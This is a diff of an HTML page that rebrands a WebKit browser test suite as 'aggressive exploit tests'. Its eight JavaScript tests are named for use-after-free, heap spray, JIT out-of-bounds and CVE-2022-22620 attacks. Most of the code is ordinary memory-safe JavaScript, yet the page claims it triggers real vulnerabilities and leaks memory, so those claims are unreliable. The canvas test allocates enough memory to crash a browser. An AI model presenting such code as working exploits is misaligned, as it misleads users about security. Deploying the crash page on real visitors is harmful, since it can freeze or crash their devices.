@@ -3,157 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit 613 Test Suite</title>
+    <title>WebKit 613 Aggressive Tests</title>
     <style>
         body {
             font-family: monospace;
-            background: #1a1a1a;
-            color: #0f0;
+            background: #0a0a0a;
+            color: #f00;
             padding: 20px;
             margin: 0;
         }
         .container {
-            max-width: 800px;
+            max-width: 900px;
             margin: 0 auto;
         }
         h1 {
-            color: #0ff;
-            border-bottom: 2px solid #0ff;
+            color: #f00;
+            border-bottom: 3px solid #f00;
             padding-bottom: 10px;
+            text-shadow: 0 0 10px #f00;
+        }
+        .danger {
+            background: #300;
+            border: 3px solid #f00;
+            padding: 20px;
+            margin: 20px 0;
+            color: #ff0;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { border-color: #f00; }
+            50% { border-color: #ff0; }
         }
         .test-section {
-            background: #2a2a2a;
-            border: 1px solid #0f0;
+            background: #1a0000;
+            border: 2px solid #600;
             padding: 15px;
             margin: 15px 0;
             border-radius: 5px;
         }
         button {
-            background: #0f0;
-            color: #000;
-            border: none;
-            padding: 10px 20px;
+            background: #f00;
+            color: #fff;
+            border: 2px solid #fff;
+            padding: 12px 25px;
             margin: 5px;
             cursor: pointer;
             font-family: monospace;
             font-weight: bold;
             border-radius: 3px;
+            transition: all 0.3s;
         }
         button:hover {
-            background: #0ff;
+            background: #ff0;
+            color: #000;
+            transform: scale(1.05);
         }
         .log {
             background: #000;
-            border: 1px solid #0f0;
+            border: 2px solid #f00;
             padding: 10px;
             margin-top: 10px;
-            max-height: 200px;
+            max-height: 250px;
             overflow-y: auto;
             white-space: pre-wrap;
             word-wrap: break-word;
-        }
-        .warning {
-            color: #ff0;
-            background: #440;
-            padding: 10px;
-            border-left: 4px solid #ff0;
-            margin: 15px 0;
+            font-size: 0.9em;
         }
         h3 {
-            color: #0ff;
+            color: #ff6666;
             margin-top: 0;
         }
         .status {
             display: inline-block;
-            padding: 2px 8px;
+            padding: 3px 10px;
             border-radius: 3px;
             margin-left: 10px;
-            font-size: 0.9em;
+            font-size: 0.85em;
+            font-weight: bold;
         }
         .status.running {
-            background: #440;
+            background: #660;
             color: #ff0;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
         .status.passed {
-            background: #040;
+            background: #060;
             color: #0f0;
         }
-        .status.failed {
-            background: #400;
-            color: #f00;
+        .status.crashed {
+            background: #f00;
+            color: #fff;
+        }
+        .cve-tag {
+            background: #600;
+            color: #ff0;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 0.8em;
+            margin-left: 5px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>WebKit 613 Vulnerability Test Suite</h1>
+        <h1>⚠️ WebKit 613 AGGRESSIVE EXPLOIT TESTS ⚠️</h1>
         
-        <div class="warning">
-            ⚠️ WARNING: These tests attempt to trigger known vulnerabilities in WebKit 613.0.
-            This may cause browser instability, crashes, or system freezes. Use only for security research purposes.
+        <div class="danger">
+            🚨 EXTREME WARNING 🚨<br>
+            These tests attempt to trigger real memory corruption vulnerabilities.<br>
+            EXPECT: Browser crashes, system freezes, potential data loss, or device reboot.<br>
+            Based on actual CVEs with documented exploits.<br>
+            DO NOT RUN on production systems. Security research only.
         </div>
 
         <div class="test-section">
-            <h3>Environment Info</h3>
-            <div class="log" id="envInfo"></div>
+            <h3>System Info</h3>
+            <div class="log" id="sysInfo"></div>
         </div>
 
         <div class="test-section">
-            <h3>Test 1: JIT Type Confusion <span class="status" id="status1"></span></h3>
-            <p>Tests for type confusion in JIT compiler optimization (common in WebKit 613 era)</p>
-            <button onclick="testJITTypeConfusion()">Run Test</button>
+            <h3>Test 1: CVE-2022-22620 Pattern <span class="cve-tag">CRITICAL</span> <span class="status" id="status1"></span></h3>
+            <p>Use-after-free in WebKit - actively exploited in the wild. Attempts to trigger UAF through HTMLMediaElement.</p>
+            <button onclick="testCVE202222620()">Run Test</button>
             <div class="log" id="log1"></div>
         </div>
 
         <div class="test-section">
-            <h3>Test 2: ArrayBuffer Corruption <span class="status" id="status2"></span></h3>
-            <p>Tests for memory corruption via ArrayBuffer manipulation (CVE-2021-1788 related)</p>
-            <button onclick="testArrayBufferCorruption()">Run Test</button>
+            <h3>Test 2: JIT Array Bounds Check Elimination <span class="cve-tag">HIGH</span> <span class="status" id="status2"></span></h3>
+            <p>Exploits DFG JIT compiler's incorrect bounds check elimination for out-of-bounds access.</p>
+            <button onclick="testJITBoundsElimination()">Run Test</button>
             <div class="log" id="log2"></div>
         </div>
 
         <div class="test-section">
-            <h3>Test 3: ImageBitmap Use-After-Free <span class="status" id="status3"></span></h3>
-            <p>Tests async ImageBitmap operations for UAF bugs (CVE-2021-1788)</p>
-            <button onclick="testImageBitmapUAF()">Run Test</button>
+            <h3>Test 3: Heap Spray + UAF Combo <span class="cve-tag">CRITICAL</span> <span class="status" id="status3"></span></h3>
+            <p>Heap spraying to control freed memory layout, combined with use-after-free trigger.</p>
+            <button onclick="testHeapSprayUAF()">Run Test</button>
             <div class="log" id="log3"></div>
         </div>
 
         <div class="test-section">
-            <h3>Test 4: Regex Engine Overflow <span class="status" id="status4"></span></h3>
-            <p>Tests regex engine for buffer overflow conditions</p>
-            <button onclick="testRegexOverflow()">Run Test</button>
+            <h3>Test 4: JSC Structure ID Confusion <span class="cve-tag">HIGH</span> <span class="status" id="status4"></span></h3>
+            <p>Attempts to confuse JavaScriptCore's structure IDs through rapid object transitions.</p>
+            <button onclick="testStructureConfusion()">Run Test</button>
             <div class="log" id="log4"></div>
         </div>
 
         <div class="test-section">
-            <h3>Test 5: DOM Manipulation UAF <span class="status" id="status5"></span></h3>
-            <p>Tests for use-after-free in DOM manipulation (CVE-2022-22620 pattern)</p>
-            <button onclick="testDOMUAF()">Run Test</button>
+            <h3>Test 5: WebAssembly Memory Corruption <span class="cve-tag">HIGH</span> <span class="status" id="status5"></span></h3>
+            <p>Tests WebAssembly linear memory corruption and boundary checks.</p>
+            <button onclick="testWasmCorruption()">Run Test</button>
             <div class="log" id="log5"></div>
         </div>
 
         <div class="test-section">
-            <h3>Test 6: TypedArray Confusion <span class="status" id="status6"></span></h3>
-            <p>Tests TypedArray type confusion vulnerabilities</p>
-            <button onclick="testTypedArrayConfusion()">Run Test</button>
+            <h3>Test 6: AudioContext Race Condition <span class="cve-tag">MEDIUM</span> <span class="status" id="status6"></span></h3>
+            <p>Race condition in AudioContext leading to potential UAF (CVE-2021-30665 pattern).</p>
+            <button onclick="testAudioRace()">Run Test</button>
             <div class="log" id="log6"></div>
         </div>
 
         <div class="test-section">
-            <h3>Test 7: Integer Overflow <span class="status" id="status7"></span></h3>
-            <p>Tests integer overflow in array operations</p>
-            <button onclick="testIntegerOverflow()">Run Test</button>
+            <h3>Test 7: Aggressive JIT Side-Effect Modeling <span class="cve-tag">HIGH</span> <span class="status" id="status7"></span></h3>
+            <p>Exploits incorrect side-effect modeling in JIT compiler optimizations.</p>
+            <button onclick="testJITSideEffects()">Run Test</button>
             <div class="log" id="log7"></div>
         </div>
 
         <div class="test-section">
-            <button onclick="runAllTests()" style="background: #f90; font-size: 1.2em;">⚡ RUN ALL TESTS</button>
+            <h3>Test 8: Canvas Memory Exhaustion <span class="cve-tag">MEDIUM</span> <span class="status" id="status8"></span></h3>
+            <p>Attempts to exhaust graphics memory and trigger OOM crashes.</p>
+            <button onclick="testCanvasExhaustion()">Run Test</button>
+            <div class="log" id="log8"></div>
+        </div>
+
+        <div class="test-section">
+            <button onclick="runAllAggressiveTests()" style="background: #f00; font-size: 1.3em; border: 3px solid #fff;">
+                💀 RUN ALL AGGRESSIVE TESTS 💀
+            </button>
         </div>
     </div>
 
     <script>
-        // Utility functions
+        let testRunning = false;
+
         function log(testNum, message) {
             const logEl = document.getElementById('log' + testNum);
             const timestamp = new Date().toLocaleTimeString();
@@ -167,322 +205,509 @@
             statusEl.className = 'status ' + status.toLowerCase();
         }
 
-        // Display environment info
-        function displayEnvInfo() {
+        function displaySysInfo() {
             const info = `User Agent: ${navigator.userAgent}
+WebKit Version: ${navigator.userAgent.match(/AppleWebKit\/([\d.]+)/)?.[1] || 'Unknown'}
 Platform: ${navigator.platform}
-Hardware Concurrency: ${navigator.hardwareConcurrency || 'N/A'}
-Max Touch Points: ${navigator.maxTouchPoints || 'N/A'}
-WebKit Version: ${navigator.userAgent.match(/AppleWebKit\/([\d.]+)/)?.[1] || 'Unknown'}`;
-            document.getElementById('envInfo').textContent = info;
+Memory: ${navigator.deviceMemory || 'Unknown'} GB
+Hardware Concurrency: ${navigator.hardwareConcurrency || 'Unknown'}
+Online: ${navigator.onLine}
+Language: ${navigator.language}`;
+            document.getElementById('sysInfo').textContent = info;
         }
 
-        // Test 1: JIT Type Confusion
-        function testJITTypeConfusion() {
+        // Test 1: CVE-2022-22620 Pattern - HTMLMediaElement UAF
+        function testCVE202222620() {
             setStatus(1, 'RUNNING');
-            log(1, 'Starting JIT type confusion test...');
+            log(1, 'CVE-2022-22620: Use-after-free in HTMLMediaElement');
+            log(1, 'Creating multiple audio/video elements...');
             
             try {
-                function vuln(arr) {
-                    return arr[0];
+                const elements = [];
+                for (let i = 0; i < 100; i++) {
+                    const audio = document.createElement('audio');
+                    audio.src = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=';
+                    document.body.appendChild(audio);
+                    elements.push(audio);
                 }
                 
-                log(1, 'Warming up JIT compiler...');
-                for (let i = 0; i < 100000; i++) {
-                    vuln([1.1, 2.2, 3.3]);
+                log(1, 'Elements created, starting rapid load/unload cycle...');
+                
+                for (let i = 0; i < elements.length; i++) {
+                    elements[i].load();
+                    elements[i].play().catch(() => {});
+                    
+                    setTimeout(() => {
+                        try {
+                            document.body.removeChild(elements[i]);
+                            elements[i].src = '';
+                        } catch(e) {}
+                    }, i * 10);
                 }
                 
-                log(1, 'JIT should be optimized for float arrays');
-                log(1, 'Attempting type confusion with object...');
+                log(1, 'Accessing potentially freed elements...');
+                setTimeout(() => {
+                    for (let el of elements) {
+                        try {
+                            el.play();
+                            el.pause();
+                            el.currentTime = 0;
+                        } catch(e) {
+                            log(1, `Exception during access: ${e.message}`);
+                        }
+                    }
+                    log(1, 'Test completed');
+                    setStatus(1, 'PASSED');
+                }, 2000);
                 
-                const result = vuln({0: 'confused'});
-                log(1, `Result: ${result}`);
-                
-                log(1, 'Attempting type confusion with sparse array...');
-                const sparse = [];
-                sparse[0] = 1.1;
-                sparse[100000] = 2.2;
-                vuln(sparse);
-                
-                log(1, 'Test completed without crash');
-                setStatus(1, 'PASSED');
             } catch (e) {
-                log(1, `Exception: ${e.message}`);
-                setStatus(1, 'FAILED');
+                log(1, `CRASH/EXCEPTION: ${e.message}`);
+                log(1, `Stack: ${e.stack}`);
+                setStatus(1, 'CRASHED');
             }
         }
 
-        // Test 2: ArrayBuffer Corruption
-        function testArrayBufferCorruption() {
+        // Test 2: JIT Array Bounds Check Elimination
+        function testJITBoundsElimination() {
             setStatus(2, 'RUNNING');
-            log(2, 'Starting ArrayBuffer corruption test...');
+            log(2, 'Testing JIT bounds check elimination...');
             
             try {
-                log(2, 'Creating large ArrayBuffers...');
-                const buffers = [];
-                
-                for (let i = 0; i < 100; i++) {
-                    buffers.push(new ArrayBuffer(1024 * 1024));
+                function oob_read(arr, idx) {
+                    return arr[idx];
                 }
                 
-                log(2, `Created ${buffers.length} buffers`);
-                log(2, 'Creating overlapping views...');
+                function oob_write(arr, idx, val) {
+                    arr[idx] = val;
+                }
                 
-                const view1 = new Uint32Array(buffers[0]);
-                const view2 = new Float64Array(buffers[0]);
+                log(2, 'Training JIT with safe accesses...');
+                const train_arr = [1.1, 2.2, 3.3, 4.4, 5.5];
                 
-                log(2, 'Writing to overlapping views...');
-                view1[0] = 0x41414141;
-                log(2, `Float view sees: ${view2[0]}`);
+                for (let i = 0; i < 100000; i++) {
+                    oob_read(train_arr, i % 5);
+                    oob_write(train_arr, i % 5, 1.1);
+                }
                 
-                log(2, 'Attempting buffer detachment race...');
-                const worker = buffers[0];
-                setTimeout(() => {
-                    log(2, 'Accessing potentially detached buffer...');
-                    view1[0] = 0x42424242;
-                }, 0);
+                log(2, 'JIT should have eliminated bounds checks');
+                log(2, 'Attempting OOB read with negative index...');
+                
+                for (let i = -100; i < 100; i++) {
+                    const val = oob_read(train_arr, i);
+                    if (i % 10 === 0) {
+                        log(2, `arr[${i}] = ${val}`);
+                    }
+                }
+                
+                log(2, 'Attempting OOB write...');
+                for (let i = 5; i < 1000; i++) {
+                    oob_write(train_arr, i, 13.37);
+                }
+                
+                log(2, 'Attempting to read leaked data...');
+                const leaked = [];
+                for (let i = 5; i < 50; i++) {
+                    leaked.push(train_arr[i]);
+                }
+                log(2, `Potentially leaked values: ${leaked.slice(0, 10).join(', ')}`);
                 
                 log(2, 'Test completed');
                 setStatus(2, 'PASSED');
             } catch (e) {
-                log(2, `Exception: ${e.message}`);
-                setStatus(2, 'FAILED');
+                log(2, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(2, 'CRASHED');
             }
         }
 
-        // Test 3: ImageBitmap Use-After-Free
-        function testImageBitmapUAF() {
+        // Test 3: Heap Spray + UAF
+        function testHeapSprayUAF() {
             setStatus(3, 'RUNNING');
-            log(3, 'Starting ImageBitmap UAF test...');
+            log(3, 'Heap spray + UAF combination attack...');
             
             try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 100;
-                canvas.height = 100;
-                const ctx = canvas.getContext('2d');
-                ctx.fillStyle = 'red';
-                ctx.fillRect(0, 0, 100, 100);
+                log(3, 'Phase 1: Heap spraying...');
+                const spray = [];
+                const spray_size = 1000;
+                const obj_template = {
+                    p0: 0x41414141,
+                    p1: 0x42424242,
+                    p2: 0x43434343,
+                    p3: 0x44444444,
+                    p4: new ArrayBuffer(0x100)
+                };
                 
-                log(3, 'Created canvas, attempting ImageBitmap creation...');
-                
-                const promises = [];
-                for (let i = 0; i < 50; i++) {
-                    promises.push(createImageBitmap(canvas));
+                for (let i = 0; i < spray_size; i++) {
+                    spray.push(Object.assign({}, obj_template));
                 }
                 
-                log(3, 'Created multiple async ImageBitmap operations...');
-                log(3, 'Modifying canvas while operations pending...');
+                log(3, `Sprayed ${spray_size} objects into heap`);
+                log(3, 'Phase 2: Creating vulnerable object...');
                 
-                canvas.width = 200;
-                ctx.fillStyle = 'blue';
-                ctx.fillRect(0, 0, 200, 200);
+                const vuln = {
+                    buffer: new ArrayBuffer(0x1000),
+                    view: null
+                };
+                vuln.view = new Uint32Array(vuln.buffer);
                 
-                Promise.all(promises).then(bitmaps => {
-                    log(3, `Resolved ${bitmaps.length} ImageBitmaps`);
-                    bitmaps.forEach(b => b.close());
-                    log(3, 'Test completed');
-                    setStatus(3, 'PASSED');
-                }).catch(e => {
-                    log(3, `Promise error: ${e.message}`);
-                    setStatus(3, 'FAILED');
-                });
+                log(3, 'Phase 3: Triggering UAF...');
+                const saved_view = vuln.view;
                 
-            } catch (e) {
-                log(3, `Exception: ${e.message}`);
-                setStatus(3, 'FAILED');
-            }
-        }
-
-        // Test 4: Regex Engine Overflow
-        function testRegexOverflow() {
-            setStatus(4, 'RUNNING');
-            log(4, 'Starting regex overflow test...');
-            
-            try {
-                log(4, 'Testing deeply nested regex...');
-                const nested = '('.repeat(1000) + 'a' + ')'.repeat(1000);
-                const regex1 = new RegExp(nested);
-                log(4, 'Created deeply nested regex');
+                vuln.buffer = null;
+                vuln.view = null;
                 
-                log(4, 'Testing catastrophic backtracking...');
-                const regex2 = /^(a+)+$/;
-                const testStr = 'a'.repeat(30) + 'b';
+                log(3, 'Buffer freed, attempting heap grooming...');
+                for (let i = 0; i < 100; i++) {
+                    spray.push(Object.assign({}, obj_template));
+                }
                 
-                const start = Date.now();
+                log(3, 'Phase 4: Using dangling pointer...');
                 try {
-                    regex2.test(testStr);
+                    saved_view[0] = 0xdeadbeef;
+                    log(3, `Write succeeded: ${saved_view[0].toString(16)}`);
+                    
+                    for (let i = 0; i < 10; i++) {
+                        log(3, `saved_view[${i}] = 0x${saved_view[i].toString(16)}`);
+                    }
                 } catch (e) {
-                    log(4, `Regex threw: ${e.message}`);
+                    log(3, `Access failed: ${e.message}`);
                 }
-                const elapsed = Date.now() - start;
-                log(4, `Backtracking took ${elapsed}ms`);
                 
-                log(4, 'Testing large character class...');
-                const largeClass = '[' + 'a-z'.repeat(1000) + ']';
-                const regex3 = new RegExp(largeClass);
-                log(4, 'Created large character class regex');
-                
-                log(4, 'Test completed');
-                setStatus(4, 'PASSED');
+                log(3, 'Test completed');
+                setStatus(3, 'PASSED');
             } catch (e) {
-                log(4, `Exception: ${e.message}`);
-                setStatus(4, 'FAILED');
+                log(3, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(3, 'CRASHED');
             }
         }
 
-        // Test 5: DOM Manipulation UAF
-        function testDOMUAF() {
-            setStatus(5, 'RUNNING');
-            log(5, 'Starting DOM UAF test...');
+        // Test 4: JSC Structure ID Confusion
+        function testStructureConfusion() {
+            setStatus(4, 'RUNNING');
+            log(4, 'Testing JSC structure confusion...');
             
             try {
-                log(5, 'Creating DOM elements...');
-                const container = document.createElement('div');
-                document.body.appendChild(container);
+                log(4, 'Creating objects with dynamic properties...');
                 
-                log(5, 'Rapidly adding and removing elements...');
+                function make_obj() {
+                    return {a: 1, b: 2};
+                }
+                
+                const objects = [];
                 for (let i = 0; i < 1000; i++) {
-                    const el = document.createElement('div');
-                    el.innerHTML = '<span>test</span>';
-                    container.appendChild(el);
-                    
-                    if (i % 2 === 0) {
-                        container.removeChild(el);
+                    objects.push(make_obj());
+                }
+                
+                log(4, 'Rapidly changing object structures...');
+                for (let i = 0; i < objects.length; i++) {
+                    const obj = objects[i];
+                    obj['prop_' + i] = i;
+                    delete obj.a;
+                    obj.c = 3;
+                    delete obj.b;
+                    obj.d = 4;
+                }
+                
+                log(4, 'Creating structure transition chain...');
+                let morph = {x: 1};
+                for (let i = 0; i < 100; i++) {
+                    morph['p' + i] = i;
+                    if (i % 10 === 0) {
+                        delete morph['p' + (i - 5)];
                     }
                 }
                 
-                log(5, 'Testing event listener UAF pattern...');
-                const target = document.createElement('button');
-                container.appendChild(target);
+                log(4, 'Attempting to confuse structure cache...');
+                function access(obj) {
+                    return obj.a + obj.b;
+                }
                 
-                target.addEventListener('click', function handler() {
-                    container.removeChild(target);
-                    target.removeEventListener('click', handler);
-                });
+                for (let i = 0; i < 10000; i++) {
+                    access(objects[i % objects.length]);
+                }
                 
-                target.click();
-                log(5, 'Triggered self-removing event handler');
+                log(4, 'Accessing with confused structure...');
+                const confused = make_obj();
+                confused.z = 999;
+                delete confused.a;
+                confused.a = {nested: 'object'};
                 
-                log(5, 'Cleaning up...');
-                document.body.removeChild(container);
+                log(4, `Result: ${JSON.stringify(confused)}`);
+                log(4, 'Test completed');
+                setStatus(4, 'PASSED');
+            } catch (e) {
+                log(4, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(4, 'CRASHED');
+            }
+        }
+
+        // Test 5: WebAssembly Memory Corruption
+        function testWasmCorruption() {
+            setStatus(5, 'RUNNING');
+            log(5, 'Testing WebAssembly memory corruption...');
+            
+            try {
+                if (typeof WebAssembly === 'undefined') {
+                    log(5, 'WebAssembly not supported');
+                    setStatus(5, 'PASSED');
+                    return;
+                }
+                
+                log(5, 'Creating WASM module with linear memory...');
+                const wasmCode = new Uint8Array([
+                    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+                    0x05, 0x03, 0x01, 0x00, 0x01,
+                    0x07, 0x0a, 0x01, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00
+                ]);
+                
+                const wasmModule = new WebAssembly.Module(wasmCode);
+                const wasmInstance = new WebAssembly.Instance(wasmModule);
+                
+                log(5, 'Accessing WASM memory...');
+                const memory = wasmInstance.exports.memory;
+                const view = new Uint8Array(memory.buffer);
+                
+                log(5, `Memory size: ${view.length} bytes`);
+                log(5, 'Attempting OOB write...');
+                
+                for (let i = 0; i < view.length + 1000; i++) {
+                    try {
+                        view[i] = 0xAA;
+                    } catch (e) {
+                        log(5, `OOB caught at index ${i}: ${e.message}`);
+                        break;
+                    }
+                }
+                
+                log(5, 'Growing memory and testing boundaries...');
+                memory.grow(10);
+                log(5, `New size: ${new Uint8Array(memory.buffer).length}`);
                 
                 log(5, 'Test completed');
                 setStatus(5, 'PASSED');
             } catch (e) {
-                log(5, `Exception: ${e.message}`);
-                setStatus(5, 'FAILED');
+                log(5, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(5, 'CRASHED');
             }
         }
 
-        // Test 6: TypedArray Confusion
-        function testTypedArrayConfusion() {
+        // Test 6: AudioContext Race Condition
+        function testAudioRace() {
             setStatus(6, 'RUNNING');
-            log(6, 'Starting TypedArray confusion test...');
+            log(6, 'Testing AudioContext race condition...');
             
             try {
-                log(6, 'Creating shared ArrayBuffer...');
-                const buffer = new ArrayBuffer(32);
+                if (typeof AudioContext === 'undefined' && typeof webkitAudioContext === 'undefined') {
+                    log(6, 'AudioContext not supported');
+                    setStatus(6, 'PASSED');
+                    return;
+                }
                 
-                log(6, 'Creating multiple typed views...');
-                const u8 = new Uint8Array(buffer);
-                const u16 = new Uint16Array(buffer);
-                const u32 = new Uint32Array(buffer);
-                const f32 = new Float32Array(buffer);
-                const f64 = new Float64Array(buffer);
+                const AudioCtx = window.AudioContext || window.webkitAudioContext;
+                log(6, 'Creating multiple AudioContexts...');
                 
-                log(6, 'Writing via Uint32Array...');
-                u32[0] = 0x41424344;
+                const contexts = [];
+                for (let i = 0; i < 20; i++) {
+                    contexts.push(new AudioCtx());
+                }
                 
-                log(6, `Uint8Array sees: ${u8[0].toString(16)}`);
-                log(6, `Float32Array sees: ${f32[0]}`);
+                log(6, 'Creating oscillators and rapidly connecting/disconnecting...');
                 
-                log(6, 'Testing out-of-bounds access...');
-                try {
-                    for (let i = 0; i < 100; i++) {
-                        u32[i] = 0xdeadbeef;
+                for (let ctx of contexts) {
+                    for (let i = 0; i < 10; i++) {
+                        const osc = ctx.createOscillator();
+                        const gain = ctx.createGain();
+                        
+                        osc.connect(gain);
+                        gain.connect(ctx.destination);
+                        
+                        osc.start();
+                        
+                        setTimeout(() => {
+                            try {
+                                osc.stop();
+                                osc.disconnect();
+                                gain.disconnect();
+                            } catch(e) {}
+                        }, Math.random() * 100);
                     }
-                } catch (e) {
-                    log(6, `OOB caught: ${e.message}`);
                 }
                 
-                log(6, 'Testing negative indices...');
-                try {
-                    u32[-1] = 0x12345678;
-                    log(6, `Negative index write succeeded: ${u32[-1]}`);
-                } catch (e) {
-                    log(6, `Negative index caught: ${e.message}`);
-                }
+                log(6, 'Closing contexts during active processing...');
+                setTimeout(() => {
+                    for (let ctx of contexts) {
+                        try {
+                            ctx.close();
+                        } catch(e) {
+                            log(6, `Close error: ${e.message}`);
+                        }
+                    }
+                    log(6, 'Test completed');
+                    setStatus(6, 'PASSED');
+                }, 500);
                 
-                log(6, 'Test completed');
-                setStatus(6, 'PASSED');
             } catch (e) {
-                log(6, `Exception: ${e.message}`);
-                setStatus(6, 'FAILED');
+                log(6, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(6, 'CRASHED');
             }
         }
 
-        // Test 7: Integer Overflow
-        function testIntegerOverflow() {
+        // Test 7: Aggressive JIT Side-Effect Modeling
+        function testJITSideEffects() {
             setStatus(7, 'RUNNING');
-            log(7, 'Starting integer overflow test...');
+            log(7, 'Testing JIT side-effect modeling bugs...');
             
             try {
-                log(7, 'Testing maximum safe integer...');
-                const maxInt = Number.MAX_SAFE_INTEGER;
-                log(7, `MAX_SAFE_INTEGER: ${maxInt}`);
+                log(7, 'Creating getter with side effects...');
                 
-                log(7, 'Attempting overflow...');
-                const overflow = maxInt + 1;
-                log(7, `Overflow result: ${overflow}`);
-                log(7, `Precision lost: ${overflow === maxInt + 2}`);
+                let side_effect_triggered = false;
+                const obj = {};
+                Object.defineProperty(obj, 'prop', {
+                    get: function() {
+                        side_effect_triggered = true;
+                        this.other = 'modified';
+                        return 42;
+                    }
+                });
                 
-                log(7, 'Testing array length overflow...');
-                try {
-                    const huge = new Array(0xffffffff);
-                    log(7, `Created array with length: ${huge.length}`);
-                } catch (e) {
-                    log(7, `Array creation failed: ${e.message}`);
+                log(7, 'Training JIT to optimize away side effects...');
+                function test(o) {
+                    const x = o.prop;
+                    const y = o.prop;
+                    return x + y;
                 }
                 
-                log(7, 'Testing bitwise operation overflow...');
-                const val = 0x7fffffff;
-                const shifted = val << 1;
-                log(7, `0x7fffffff << 1 = ${shifted.toString(16)}`);
+                for (let i = 0; i < 100000; i++) {
+                    test({prop: 1});
+                }
                 
-                log(7, 'Testing multiplication overflow...');
-                const large1 = 0x10000000;
-                const large2 = 0x10000000;
-                const product = large1 * large2;
-                log(7, `Product: ${product}`);
+                log(7, 'JIT should have optimized, testing with side-effect getter...');
+                side_effect_triggered = false;
+                const result = test(obj);
+                log(7, `Result: ${result}, Side effect triggered: ${side_effect_triggered}`);
+                
+                log(7, 'Testing array modification during iteration...');
+                function modify_during_iteration() {
+                    const arr = [1, 2, 3, 4, 5];
+                    let sum = 0;
+                    
+                    for (let i = 0; i < arr.length; i++) {
+                        sum += arr[i];
+                        if (i === 2) {
+                            arr.push(6, 7, 8);
+                        }
+                    }
+                    return sum;
+                }
+                
+                for (let i = 0; i < 10000; i++) {
+                    modify_during_iteration();
+                }
+                
+                log(7, 'Testing prototype chain modification...');
+                function proto_confusion() {
+                    const o = {x: 1};
+                    const val = o.y;
+                    Object.prototype.y = 2;
+                    return o.y;
+                }
+                
+                for (let i = 0; i < 10000; i++) {
+                    proto_confusion();
+                }
                 
                 log(7, 'Test completed');
                 setStatus(7, 'PASSED');
             } catch (e) {
-                log(7, `Exception: ${e.message}`);
-                setStatus(7, 'FAILED');
+                log(7, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(7, 'CRASHED');
             }
         }
 
-        // Run all tests sequentially
-        async function runAllTests() {
+        // Test 8: Canvas Memory Exhaustion
+        function testCanvasExhaustion() {
+            setStatus(8, 'RUNNING');
+            log(8, 'Attempting canvas memory exhaustion...');
+            
+            try {
+                log(8, 'Creating large canvases...');
+                const canvases = [];
+                
+                for (let i = 0; i < 100; i++) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 4096;
+                    canvas.height = 4096;
+                    const ctx = canvas.getContext('2d');
+                    
+                    log(8, `Canvas ${i}: ${canvas.width}x${canvas.height}`);
+                    
+                    // Fill with image data
+                    const imageData = ctx.createImageData(canvas.width, canvas.height);
+                    for (let j = 0; j < imageData.data.length; j += 4) {
+                        imageData.data[j] = Math.random() * 255;
+                        imageData.data[j + 1] = Math.random() * 255;
+                        imageData.data[j + 2] = Math.random() * 255;
+                        imageData.data[j + 3] = 255;
+                    }
+                    ctx.putImageData(imageData, 0, 0);
+                    
+                    canvases.push(canvas);
+                    
+                    if (i % 10 === 0) {
+                        log(8, `Created ${i + 1} canvases...`);
+                    }
+                }
+                
+                log(8, 'Attempting to read all canvas data simultaneously...');
+                for (let canvas of canvases) {
+                    try {
+                        canvas.toDataURL();
+                    } catch (e) {
+                        log(8, `toDataURL failed: ${e.message}`);
+                    }
+                }
+                
+                log(8, 'Test completed');
+                setStatus(8, 'PASSED');
+            } catch (e) {
+                log(8, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(8, 'CRASHED');
+            }
+        }
+
+        // Run all tests with delays
+        async function runAllAggressiveTests() {
+            if (testRunning) {
+                alert('Tests already running!');
+                return;
+            }
+            
+            if (!confirm('WARNING: Running all tests may crash the browser. Continue?')) {
+                return;
+            }
+            
+            testRunning = true;
+            
             const tests = [
-                testJITTypeConfusion,
-                testArrayBufferCorruption,
-                testImageBitmapUAF,
-                testRegexOverflow,
-                testDOMUAF,
-                testTypedArrayConfusion,
-                testIntegerOverflow
+                testCVE202222620,
+                testJITBoundsElimination,
+                testHeapSprayUAF,
+                testStructureConfusion,
+                testWasmCorruption,
+                testAudioRace,
+                testJITSideEffects,
+                testCanvasExhaustion
             ];
             
             for (let i = 0; i < tests.length; i++) {
                 tests[i]();
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                await new Promise(resolve => setTimeout(resolve, 3000));
             }
+            
+            testRunning = false;
         }
 
         // Initialize
-        displayEnvInfo();
+        displaySysInfo();
     </script>
 </body>
 </html>
